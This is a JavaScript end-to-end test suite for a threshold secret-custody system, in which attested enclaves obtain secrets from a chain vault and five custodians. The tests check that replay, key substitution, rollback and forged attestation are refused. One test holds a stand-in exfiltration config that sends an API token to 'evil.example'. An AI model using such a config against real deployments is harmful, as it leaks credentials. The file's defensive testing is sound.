// Custody end to end (docs/security/secret-custody.md): owner -> Base vault (anvil) -> five custodians over HTTP -> an attested
// recipient. SIMULATED ATTESTATION: reports are signed by a synthetic AMD-shaped chain and judged by the REAL verifier with that
// chain's root in place of AMD's (test/helpers/custody-rig.mjs). The hardware-backed checks are test/custody-hardware.test.mjs.
//   run: node --test test/custody-e2e.test.mjs        (needs anvil from Foundry; skipped, saying so, without it)
import test from "node:test";
import assert from "node:assert/strict";
import { randomBytes, createHash } from "node:crypto";
import { keccak256, toBytes } from "viem";
import { custodyRig, anvilAvailable, snpAttester, resign, RUNTIME, MEASUREMENT, FLOOR } from "./helpers/custody-rig.mjs";
import { buildBundle, makeUpdate, updateTypedData, UPDATE_ABI } from "../custody/owner.mjs";
import { obtainSecrets } from "../custody/recipient.mjs";
import { makeDeal, receiveDeals } from "../custody/reshare.mjs";
import { createCustodian } from "../custody/custodian.mjs";
import { createChainReader, VAULT_ABI } from "../custody/chain.mjs";
import * as P from "../custody/protocol.mjs";
import * as hpke from "../custody/hpke.mjs";
import * as th from "../custody/threshold.mjs";
import { runtimeId } from "../isolation/contract/runtime.mjs";

const SKIP = anvilAvailable() ? false : "anvil (Foundry) is not installed: the custody end-to-end suite needs a real chain";
const sha = (s) => createHash("sha256").update(s).digest();
const APP = sha("the approved app bundle");
const OTHER_APP = sha("some other app bundle");
const ENV = { DATABASE_URL: "postgres://synthetic-user:synthetic-pass@db.example/app", API_TOKEN: "synthetic-token-" + "x".repeat(40) };
const RULES = { v: 1, appId: APP.toString("hex"), images: [{ platform: "sev-snp", measurement: MEASUREMENT, runtimeId: runtimeId(RUNTIME).toString("hex") }], minTcb: FLOOR, vmpl: 0 };
const newId = () => "0x" + randomBytes(32).toString("hex");
// the config the owner commits its values to (the guest substitutes into nothing else)
const CONFIG_TEXT = P.configTextOf({ db: "${DATABASE_URL}", token: "$API_TOKEN" });

let R, owner, hostA, hostB, stranger;
const EP_A = "https://api.enclave.host/t/host-a", EP_B = "https://api.enclave.host/t/host-b";

test.before(async () => {
  if (SKIP) return;
  R = await custodyRig({ n: 5, t: 3 });
  owner = await R.account(); hostA = await R.account(); hostB = await R.account(); stranger = await R.account();
  await R.registerHost(EP_A, hostA.address);
  await R.registerHost(EP_B, hostB.address);
});
test.after(async () => { if (R) await R.stop(); });

// the owner publishes rules + a bundle for `env` (as a transaction from the owner's wallet)
async function publish(id, env = ENV, { rules = RULES, committeeId = R.committeeId, ownerAcct = owner, configText = CONFIG_TEXT } = {}) {
  const reader = R.reader();
  const st = await reader.readState({ id });
  const { epoch } = await reader.readCommittee({ committeeId });
  const ep = await reader.readEpoch({ committeeId, epoch });
  const bundle = buildBundle({ chainId: R.chainId, vault: R.vault, id, secretRev: st.policy.secretRev + 1n, committeeId, epoch,
                               threshold: ep.threshold, members: ep.members, env, configText });
  await R.send(ownerAcct, R.vault, UPDATE_ABI, "update", [id, makeUpdate({ expectPolicyRev: st.policy.policyRev, policy: { committeeId, paused: false, rules }, bundle: { ...bundle, epoch } })]);
  return bundle;
}

const operatorAuth = (acct) => async ({ messageFor }) => {
  const expiry = Math.floor(Date.now() / 1000) + 300;
  return { sig: await acct.signMessage({ message: messageFor(expiry) }), expiry };
};

// one attempt by a recipient on `endpoint`, run by `host`, with an attester
async function attempt(id, { endpoint = EP_A, host = hostA, attester, post = R.post, state = null, minCustodians = null, configText = CONFIG_TEXT } = {}) {
  const st = state || await R.reader().readState({ id });
  return obtainSecrets({ chainId: R.chainId, vault: R.vault, id, endpoint, state: st, minCustodians, configText,
                         attester: attester || snpAttester(R.S, { appId: APP, hostData: P.id32(id) }), authorize: operatorAuth(host), post });
}
const refusalCodes = (e) => (e.refusals || []).map((r) => r.reason.split(":")[0]);

test("happy path: the attested app gets its secrets, the owner offline, no relay involved", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const out = await attempt(id);
  assert.deepEqual(out.env, ENV);
  assert.equal(out.released.length, 5);
  // nothing secret in any custodian log line: no value, no share, no key
  const all = R.logs.join("\n");
  for (const v of Object.values(ENV)) assert.ok(!all.includes(v), "a secret value reached a log");
  for (const m of R.members) assert.ok(!all.includes(Buffer.from(m.encPrivateKey).toString("hex")), "a private key reached a log");
});

test("the chain holds only ciphertext: the bundle and every share are useless without a threshold of custodian keys", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const st = await R.reader().readState({ id });
  const raw = Buffer.from(st.bundle.ciphertext).toString("latin1") + st.shares.sealedShares.map((s) => Buffer.from(s).toString("latin1")).join("");
  for (const v of Object.values(ENV)) assert.ok(!raw.includes(v));
  // two custodians colluding (below the threshold) learn nothing usable: two shares do not reconstruct the key
  const coms = P.splitCommitments(st.shares.commitments);
  const two = [0, 1].map((i) => ({ x: i + 1, y: P.openShareAtRest(R.members[i].encPrivateKey, { chainId: R.chainId, vault: R.vault, id, secretRev: st.policy.secretRev, committeeId: st.policy.committeeId, epoch: st.bundle.epoch, index: i, commitments: coms }, st.shares.sealedShares[i]) }));
  assert.throws(() => th.combine(two, 3), /need 3 shares/);
  const guess = th.combine([...two, { x: 3, y: 1n }], 3);   // any third value gives SOME scalar, never the right one
  assert.throws(() => P.decryptBundle(P.deriveDek(guess, { chainId: R.chainId, vault: R.vault, id, secretRev: st.policy.secretRev }), P.bundleAad({ chainId: R.chainId, vault: R.vault, id, secretRev: st.policy.secretRev, c0: coms[0] }), st.bundle.ciphertext));
});

test("config substitution: the values are refused for any config but the one the owner committed (review H2)", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const evil = P.configTextOf({ db: "${DATABASE_URL}", token: "$API_TOKEN", report: "https://evil.example/collect?k=$API_TOKEN" });
  await assert.rejects(attempt(id, { configText: evil }), (e) => e.code === "config_mismatch");
  assert.deepEqual((await attempt(id)).env, ENV);
});

test("app substitution: another app's code (its own AppID) on the lease holder gets nothing", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  await assert.rejects(attempt(id, { attester: snpAttester(R.S, { appId: OTHER_APP, hostData: P.id32(id) }) }), (e) => {
    assert.equal(e.code, "insufficient_quorum");
    assert.ok(refusalCodes(e).every((c) => c === "evidence_refused"), refusalCodes(e).join());
    return true;
  });
});

test("image substitution: the right AppID in an image the owner did not admit (another measurement) gets nothing", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const attester = snpAttester(R.S, { appId: APP, hostData: P.id32(id), tamper: (r) => resign(R.S, r, { measurement: "66".repeat(48) }) });
  await assert.rejects(attempt(id, { attester }), (e) => e.code === "insufficient_quorum" && refusalCodes(e).every((c) => c === "evidence_refused"));
  // and a runtime the owner did not admit is refused before any evidence is judged
  const other = snpAttester(R.S, { appId: APP, hostData: P.id32(id), runtime: { ...RUNTIME, version: "41.0.0" } });
  await assert.rejects(attempt(id, { attester: other }), (e) => refusalCodes(e).every((c) => c === "runtime_not_admitted"));
});

test("confused deputy: a guest launched for deployment B (HOST_DATA) cannot claim deployment A's secrets", { skip: SKIP }, async () => {
  const a = newId(), b = newId();
  await R.setDeployment(a, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await R.setDeployment(b, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(a);
  await assert.rejects(attempt(a, { attester: snpAttester(R.S, { appId: APP, hostData: P.id32(b) }) }), (e) => refusalCodes(e).every((c) => c === "evidence_refused"));
});

test("recipient-key substitution: the HOST re-points a valid request at its own key and re-signs it as operator: refused", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const thief = hpke.generateKeyPair();
  // the host sees the whole request and holds the operator key, so it can make the operator signature match the swapped
  // key; only the hardware evidence (report_data = the binding over the GUEST's key) stands in its way
  const reswap = async (body) => {
    const challenges = body.challenges.map((c) => ({ encKey: Buffer.from(c.encKey, "hex"), nonce: Buffer.from(c.nonce, "hex") }));
    const binding = P.releaseBinding({ chainId: R.chainId, vault: R.vault, id, policyRev: BigInt(body.policyRev), secretRev: BigInt(body.secretRev), epoch: body.epoch,
      challenges, runtimeId: new Uint8Array(runtimeId(body.evidence.runtime)), transportSpki: new Uint8Array(Buffer.from(body.evidence.transportKey, "base64")), recipientKey: thief.publicKey });
    const expiry = Math.floor(Date.now() / 1000) + 300;
    return { ...body, recipientKey: P.hex(thief.publicKey),
             operator: { sig: await hostA.signMessage({ message: P.operatorMessage({ chainId: R.chainId, vault: R.vault, id, endpoint: EP_A, binding, expiry }) }), expiry } };
  };
  let swapped = 0;
  const post = async (url, body) => { if (url.endsWith("/v1/custody/release")) { swapped++; body = await reswap(body); } return R.post(url, body); };
  await assert.rejects(attempt(id, { post }), (e) => e.code === "insufficient_quorum" && refusalCodes(e).every((c) => c === "evidence_refused"));
  assert.equal(swapped, 5);
  // a third party without the operator key does not even get that far
  const naive = async (url, body) => R.post(url, url.endsWith("/release") ? { ...body, recipientKey: P.hex(thief.publicKey) } : body);
  await assert.rejects(attempt(id, { post: naive }), (e) => refusalCodes(e).every((c) => c === "operator_sig"));
});

test("replay: a captured release request (challenges, evidence, operator signature) is refused on resend", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const captured = [];
  const post = async (url, body) => { if (url.endsWith("/release")) captured.push([url, body]); return R.post(url, body); };
  const out = await attempt(id, { post });
  assert.deepEqual(out.env, ENV);
  for (const [url, body] of captured) await assert.rejects(R.post(url, body), (e) => e.code === "bad_challenge");
  // a challenge from ANOTHER custodian does not stand in for this one's
  const [url, body] = captured[0];
  const other = captured[1][1].challenges;
  await assert.rejects(R.post(url, { ...body, challenges: other.filter((c) => !url.includes(String(R.members[0].port)) || true).map((c, i) => (i === 0 ? { ...c, nonce: "00".repeat(32) } : c)) }), (e) => ["bad_challenge", "not_challenged"].includes(e.code));
});

test("stale state: a request for an old policy, an old secret revision, or after the lease ended is refused", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const old = await R.reader().readState({ id });
  await publish(id, { ...ENV, API_TOKEN: "rotated" });           // a new secret revision (and policy revision)
  await assert.rejects(attempt(id, { state: old }), (e) => refusalCodes(e).every((c) => c === "stale_revision"));
  // the fresh state works and carries the NEW value: a rollback to the old bundle is not possible
  assert.equal((await attempt(id)).env.API_TOKEN, "rotated");
  // the lease ends
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address, leaseFor: 60 });
  await R.warp(120);
  await assert.rejects(attempt(id), (e) => refusalCodes(e).every((c) => c === "not_lease_holder"));
});

test("invalid or debug attestation: DEBUG policy, VLEK signer, wrong VMPL, a foreign root, or a tampered report are refused", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const bad = [
    (r) => resign(R.S, r, { debug: true }),
    (r) => resign(R.S, r, { signingKey: 1 }),
    (r) => resign(R.S, r, { vmpl: 1 }),
    (r) => { const x = Buffer.from(r); x[0x90] ^= 1; return x; },    // measurement flipped AFTER signing
  ];
  for (const tamper of bad)
    await assert.rejects(attempt(id, { attester: snpAttester(R.S, { appId: APP, hostData: P.id32(id), tamper }) }), (e) => refusalCodes(e).every((c) => c === "evidence_refused"));
  // a report from a DIFFERENT (synthetic) AMD-shaped chain: genuine-looking, but not under the pinned root
  const { synthChain } = await import("./helpers/snp-synth.mjs");
  const foreign = synthChain();
  await assert.rejects(attempt(id, { attester: snpAttester(foreign, { appId: APP, hostData: P.id32(id) }) }), (e) => refusalCodes(e).every((c) => c === "evidence_refused"));
  // unsupported platforms fail closed: a TDX document is not judged at all
  const tdx = { runtime: RUNTIME, transportSpki: new Uint8Array(91).fill(1), evidence: async () => ({ format: "tdx-quote-v4", runtime: RUNTIME, transportKey: Buffer.alloc(91, 1).toString("base64"), quote: "AAAA" }) };
  await assert.rejects(attempt(id, { attester: tdx }), (e) => refusalCodes(e).every((c) => c === "unsupported_evidence"));
});

test("TCB below the owner's floor is refused", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id, ENV, { rules: { ...RULES, minTcb: { Genoa: { bootloader: 10, tee: 0, snp: 24, microcode: 84 } } } });
  await assert.rejects(attempt(id), (e) => refusalCodes(e).every((c) => c === "evidence_refused"));
});

test("lease and operator: a host without the lease, or a signature by anyone but the lease holder's operator, is refused", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  // host B runs a perfectly attested guest, but holds no lease
  await assert.rejects(attempt(id, { endpoint: EP_B, host: hostB }), (e) => refusalCodes(e).every((c) => c === "not_lease_holder"));
  // the lease holder's endpoint, signed by someone else
  await assert.rejects(attempt(id, { endpoint: EP_A, host: stranger }), (e) => refusalCodes(e).every((c) => c === "operator_sig"));
});

test("migration: the lease moves to host B; B's fresh guest gets the secrets with the owner offline, A's no longer does", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  assert.deepEqual((await attempt(id)).env, ENV);
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_B, operator: hostB.address });   // the ledger: B claimed
  assert.deepEqual((await attempt(id, { endpoint: EP_B, host: hostB })).env, ENV);
  await assert.rejects(attempt(id, { endpoint: EP_A, host: hostA }), (e) => refusalCodes(e).every((c) => c === "not_lease_holder"));
});

test("insufficient quorum: with 3 of 5 custodians down nothing is released; with 2 down the other 3 suffice", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const [m0, m1, m2] = R.members;
  await R.stopCustodian(m0); await R.stopCustodian(m1);
  try {
    const out = await attempt(id);
    assert.deepEqual(out.env, ENV);
    assert.equal(out.released.length, 3);
    await R.stopCustodian(m2);
    await assert.rejects(attempt(id), (e) => e.code === "insufficient_quorum");
  } finally {
    for (const m of [m0, m1, m2]) await R.startCustodian(m);
  }
  assert.deepEqual((await attempt(id)).env, ENV);
});

test("a lying custodian is detected by the commitments and outvoted, never mixed in", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const liar = R.members[1];
  const post = async (url, body) => {
    const r = await R.post(url, body);
    if (url === `${liar.endpoint}/v1/custody/release`)   // re-seal a WRONG share to the same recipient key, same binding
      return { ...r, sealed: Buffer.from(hpke.seal(P.fixed(body.recipientKey, 32, "k"), P.INFO.SHARE_RELEASE, new Uint8Array(32), th.scalarToBytes(12345n))).toString("base64") };
    return r;
  };
  const out = await attempt(id, { post });
  assert.deepEqual(out.env, ENV);
  assert.equal(out.refusals.length, 1);
  assert.equal(out.refusals[0].index, 1);
});

test("custodian restart: state is one key; outstanding challenges die with the process, a fresh request succeeds", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const m = R.members[3];
  const ch = await R.post(`${m.endpoint}/v1/custody/challenge`, {});
  await R.stopCustodian(m);
  await R.startCustodian(m);          // a new process: same key, no memory
  assert.equal(m.custodian._nonces.size, 0);
  // the pre-restart challenge is unknown to the new process
  const st = await R.reader().readState({ id });
  const body = { v: 1, id, endpoint: EP_A, policyRev: String(st.policy.policyRev), secretRev: String(st.policy.secretRev), epoch: st.bundle.epoch,
                 challenges: [{ encKey: ch.encKey, nonce: ch.nonce }], recipientKey: "11".repeat(32), evidence: {}, operator: { sig: "0x", expiry: 0 } };
  await assert.rejects(R.post(`${m.endpoint}/v1/custody/release`, body), (e) => e.code === "bad_challenge");
  assert.deepEqual((await attempt(id)).env, ENV);
});

test("owner controls: pause stops every release; an ownership transfer stops them until the new owner acts", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  let st = await R.reader().readState({ id });
  await R.send(owner, R.vault, UPDATE_ABI, "update", [id, makeUpdate({ expectPolicyRev: st.policy.policyRev, policy: { committeeId: R.committeeId, paused: true, rules: RULES } })]);
  await assert.rejects(attempt(id), (e) => refusalCodes(e).every((c) => c === "paused"));
  st = await R.reader().readState({ id });
  await R.send(owner, R.vault, UPDATE_ABI, "update", [id, makeUpdate({ expectPolicyRev: st.policy.policyRev, policy: { committeeId: R.committeeId, paused: false, rules: RULES } })]);
  assert.deepEqual((await attempt(id)).env, ENV);
  const buyer = await R.account();
  await R.setDeployment(id, { owner: buyer.address, endpoint: EP_A, operator: hostA.address });   // the ledger transferred it
  await assert.rejects(attempt(id), (e) => refusalCodes(e).every((c) => c === "owner_mismatch"));
  await R.send(buyer, R.vault, UPDATE_ABI, "claimPolicy", [id]);
  await assert.rejects(attempt(id), (e) => /no custody policy|no complete bundle|paused/.test(e.message) || refusalCodes(e).every((c) => c === "paused"));
});

test("passkey / gasless path: an EIP-712 update signed by the owner and submitted by a relayer is accepted on chain", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  const reader = R.reader();
  const ep = await reader.readEpoch({ committeeId: R.committeeId, epoch: 1 });
  const bundle = buildBundle({ chainId: R.chainId, vault: R.vault, id, secretRev: 1n, committeeId: R.committeeId, epoch: 1, threshold: ep.threshold, members: ep.members, env: ENV, configText: CONFIG_TEXT });
  const u = makeUpdate({ expectPolicyRev: 0, policy: { committeeId: R.committeeId, paused: false, rules: RULES }, bundle: { ...bundle, epoch: 1 } });
  const deadline = Math.floor(Date.now() / 1000) + 600;
  const td = updateTypedData({ chainId: R.chainId, vault: R.vault, id, update: u, deadline });
  // the off-chain digest equals the contract's own
  const onchain = await R.pub.readContract({ address: R.vault, abi: UPDATE_ABI, functionName: "updateDigest", args: [id, u, BigInt(deadline)] });
  const { hashTypedData } = await import("viem");
  assert.equal(hashTypedData(td), onchain);
  const sig = await owner.signTypedData(td);
  await R.send(stranger, R.vault, UPDATE_ABI, "updateBySig", [id, u, BigInt(deadline), sig]);   // the stranger pays gas only
  assert.deepEqual((await attempt(id)).env, ENV);
});

test("chain agreement: custodians refuse when their RPCs disagree, and never act on a rolled-back read", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  // a second "RPC" that reports a different (older) state for the same block
  const real = R.reader();
  const liar = { ...real, readRelease: async (q) => { const s = await real.readRelease(q); return { ...s, policy: { ...s.policy, policyRev: s.policy.policyRev - 1n } }; } };
  const m = R.members[0];
  const c = createCustodian({ chainId: R.chainId, vault: R.vault, encPrivateKey: m.encPrivateKey, chain: real, verifiers: R.verifiers, log: () => {} });
  // first a good read raises the high-water mark ...
  const st = await real.readState({ id });
  const good = await (async () => {
    const challenge = c.challenge();
    const at = snpAttester(R.S, { appId: APP, hostData: P.id32(id) });
    const recipient = hpke.generateKeyPair();
    const challenges = [{ encKey: c.encKey, nonce: Buffer.from(challenge.nonce, "hex") }];
    const binding = P.releaseBinding({ chainId: R.chainId, vault: R.vault, id, policyRev: st.policy.policyRev, secretRev: st.policy.secretRev, epoch: st.bundle.epoch,
      challenges, runtimeId: new Uint8Array(runtimeId(RUNTIME)), transportSpki: at.transportSpki, recipientKey: recipient.publicKey });
    const expiry = Math.floor(Date.now() / 1000) + 300;
    return { v: 1, id, endpoint: EP_A, policyRev: String(st.policy.policyRev), secretRev: String(st.policy.secretRev), epoch: st.bundle.epoch,
             challenges: challenges.map((x) => ({ encKey: P.hex(x.encKey), nonce: P.hex(x.nonce) })), recipientKey: P.hex(recipient.publicKey),
             evidence: await at.evidence(binding), operator: { sig: await hostA.signMessage({ message: P.operatorMessage({ chainId: R.chainId, vault: R.vault, id, endpoint: EP_A, binding, expiry }) }), expiry } };
  })();
  await c.release(good);
  // ... then the same custodian, fed a rolled-back read, refuses
  const c2 = createCustodian({ chainId: R.chainId, vault: R.vault, encPrivateKey: m.encPrivateKey, chain: liar, verifiers: R.verifiers, log: () => {},
                               highWater: { get: () => ({ block: "0", policyRev: String(st.policy.policyRev), secretRev: "0" }), set: () => {} } });
  const ch2 = c2.challenge();
  await assert.rejects(c2.release({ ...good, challenges: [{ encKey: c2.encKeyHex, nonce: ch2.nonce }] }), (e) => e.code === "chain_rollback");
  // and a reader over two RPCs that disagree throws chain_unconfirmed
  const { createPublicClient, http } = await import("viem");
  const second = await (await import("./helpers/custody-rig.mjs")).startAnvil();
  try {
    const both = createChainReader({ clients: [createPublicClient({ transport: http(R.anvil.url) }), createPublicClient({ transport: http(second.url) })], vault: R.vault, minAgree: 2 });
    await assert.rejects(both.readState({ id }), (e) => e.code === "chain_unconfirmed");
  } finally { second.stop(); }
});

test("membership change by resharing: one member replaced, keys rotated; the new committee serves, the removed member cannot", { skip: SKIP }, async () => {
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const reader = R.reader();
  const { epoch: from } = await reader.readCommittee({ committeeId: R.committeeId });
  // the new epoch: members 0..3 rotate to NEW share keys, member 4 is replaced by a newcomer
  const rotated = [];
  for (let i = 0; i < 4; i++) { const k = hpke.generateKeyPair(); rotated.push({ ...R.members[i], encPrivateKey: k.privateKey, encKey: k.publicKey, old: R.members[i] }); }
  const newcomerOp = await R.account(), nk = hpke.generateKeyPair();
  const newcomer = { op: newcomerOp, encPrivateKey: nk.privateKey, encKey: nk.publicKey };
  const nextMembers = [...rotated, newcomer];
  // the rotated members serve under new keys from new servers; the newcomer needs a server too
  for (const m of nextMembers) { m.port = undefined; await R.startCustodian(m); }
  const committee = R.committeeMembers(nextMembers);
  for (let i = 0; i < 3; i++) await R.send(R.members[i].op, R.vault, UPDATE_ABI, "approveEpoch", [R.committeeId, 3, committee]);
  const to = from + 1;
  assert.equal((await reader.readCommittee({ committeeId: R.committeeId })).epoch, to);
  // the old members deal (their OLD keys open their old shares)
  const st = await reader.readState({ id });
  const oldCom = P.splitCommitments(st.shares.commitments);
  const newEp = await reader.readEpoch({ committeeId: R.committeeId, epoch: to });
  const fields = { chainId: R.chainId, vault: R.vault, id, secretRev: st.policy.secretRev, committeeId: R.committeeId };
  for (const i of [0, 2, 4]) {
    const y = P.openShareAtRest(R.members[i].encPrivateKey, { ...fields, epoch: from, index: i, commitments: oldCom }, st.shares.sealedShares[i]);
    const deal = makeDeal({ ...fields, fromEpoch: from, toEpoch: to, dealer: i, y, newMembers: newEp.members, tNew: newEp.threshold });
    await R.send(R.members[i].op, R.vault, VAULT_ABI, "postDeal", [id, to, "0x" + Buffer.from(deal).toString("hex")]);
  }
  // each new member receives and posts its new share, sealed to its NEW key
  const { deals } = await reader.readDeals({ id, secretRev: st.policy.secretRev, fromEpoch: from, toEpoch: to });
  for (const [j, m] of nextMembers.entries()) {
    const r = receiveDeals({ ...fields, fromEpoch: from, toEpoch: to, member: j, encPrivate: m.encPrivateKey, deals, oldCommitments: oldCom, tOld: 3, tNew: 3, nNew: 5 });
    const sealed = P.sealShareAtRest(m.encKey, { ...fields, epoch: to, index: j, commitments: r.commitments }, r.y);
    const source = (BigInt(from) << 32n) | BigInt(r.bitmap);
    await R.send(m.op, R.vault, VAULT_ABI, "postReshare", [id, to, source, "0x" + Buffer.concat(r.commitments.map((c) => Buffer.from(c))).toString("hex"), "0x" + Buffer.from(sealed).toString("hex")]);
  }
  const after = await reader.readState({ id });
  assert.equal(after.bundle.epoch, to);
  // the SAME data key: C0 unchanged, and the new committee releases the same env
  assert.deepEqual(Buffer.from(P.splitCommitments(after.shares.commitments)[0]), Buffer.from(oldCom[0]));
  assert.deepEqual((await attempt(id)).env, ENV);
  // the removed member (old member 4, old key) is no member of the new epoch
  const removed = R.members[4];
  const ch = await R.post(`${removed.endpoint}/v1/custody/challenge`, {});
  const body = { v: 1, id, endpoint: EP_A, policyRev: String(after.policy.policyRev), secretRev: String(after.policy.secretRev), epoch: after.bundle.epoch,
                 challenges: [{ encKey: ch.encKey, nonce: ch.nonce }], recipientKey: "11".repeat(32), evidence: { format: "x" }, operator: { sig: "0x", expiry: Math.floor(Date.now() / 1000) + 60 } };
  await assert.rejects(R.post(`${removed.endpoint}/v1/custody/release`, body), (e) => e.code === "not_member");
  for (const m of nextMembers) await R.stopCustodian(m);
});

// review H1: an RPC that lags behind a pause must not drag the agreed block back before it
test("a lagging RPC cannot roll the custodians or the relay back past a pause; a stale chain is refused", { skip: SKIP }, async () => {
  const { createPublicClient, http } = await import("viem");
  const { createCustodyReader } = await import("../relay/custody-state.mjs");
  const id = newId();
  await R.setDeployment(id, { owner: owner.address, endpoint: EP_A, operator: hostA.address });
  await publish(id);
  const frozen = await R.pub.getBlockNumber({ cacheTime: 0 });   // the laggard is stuck here, BEFORE the pause
  let st = await R.reader().readState({ id });
  await R.send(owner, R.vault, UPDATE_ABI, "update", [id, makeUpdate({ expectPolicyRev: st.policy.policyRev, policy: { committeeId: R.committeeId, paused: true, rules: RULES } })]);
  const honest = () => createPublicClient({ transport: http(R.anvil.url) });
  // a node stuck at `frozen`: it reports that head and cannot answer for any later block
  const laggard = () => { const c = honest(); return { ...c,
    getBlockNumber: async () => frozen,
    getBlock: async (a) => { if (a && a.blockNumber > frozen) throw new Error("header not found"); return c.getBlock(a); },
    readContract: async (a) => { if (a.blockNumber > frozen) throw new Error("header not found"); return c.readContract(a); } }; };
  const reader = createChainReader({ clients: [honest(), honest(), laggard()], vault: R.vault, minAgree: 2 });
  assert.equal((await reader.readState({ id })).policy.paused, true, "read at the highest head: the pause holds");
  const strict = createChainReader({ clients: [honest(), laggard()], vault: R.vault, minAgree: 2 });
  await assert.rejects(strict.readState({ id }), (e) => e.code === "chain_unconfirmed", "the laggard drops out; two are needed");
  const relay = createCustodyReader({ vault: R.vault, chainId: R.chainId, clients: [honest(), honest(), laggard()], minAgree: 2 });
  assert.equal((await relay.custodyStateFor(id)).policyRev, String((await reader.readState({ id })).policy.policyRev));
  // freshness: a reader whose clock is far past the newest block refuses it
  const late = createChainReader({ clients: [honest()], vault: R.vault, minAgree: 1, maxAgeSec: 60, now: () => Date.now() + 3600_000 });
  await assert.rejects(late.readState({ id }), (e) => e.code === "chain_stale");
  const lateRelay = createCustodyReader({ vault: R.vault, chainId: R.chainId, clients: [honest()], minAgree: 1, now: () => Date.now() + 3600_000 });
  await assert.rejects(lateRelay.custodyStateFor(id), (e) => e.code === "custody_unconfirmed");
});

// review M2: one client cannot fill a custodian's challenge table or its durable high-water store
test("custodian limits: per-client challenge cap, per-client request rate, and no high-water entry for unknown ids", { skip: SKIP }, async () => {
  const { rateLimiter } = await import("../custody/custodian.mjs");
  const writes = [];
  const c = createCustodian({ chainId: R.chainId, vault: R.vault, encPrivateKey: R.members[0].encPrivateKey, chain: R.reader(), verifiers: R.verifiers,
                              maxNoncesPerClient: 3, log: () => {}, highWater: { get: () => null, set: (id) => writes.push(id) } });
  for (let i = 0; i < 3; i++) c.challenge({ client: "1.2.3.4" });
  assert.throws(() => c.challenge({ client: "1.2.3.4" }), (e) => e.code === "rate_limited");
  c.challenge({ client: "5.6.7.8" });   // another client is unaffected
  const ch = c.challenge({ client: "9.9.9.9" });
  const unknown = newId();
  await assert.rejects(c.release({ v: 1, id: unknown, endpoint: EP_A, policyRev: "1", secretRev: "1", epoch: 1, challenges: [{ encKey: c.encKeyHex, nonce: ch.nonce }],
    recipientKey: "11".repeat(32), evidence: { format: "x" }, operator: { sig: "0x", expiry: 1 } }), (e) => e.code === "no_policy");
  assert.deepEqual(writes, [], "an id with no policy leaves nothing in the durable store");
  let t = 0;
  const rate = rateLimiter({ capacity: 2, refillPerSec: 1, now: () => t });
  assert.deepEqual([rate("a"), rate("a"), rate("a"), rate("b")], [true, true, false, true]);
  t += 1000;
  assert.equal(rate("a"), true);
});
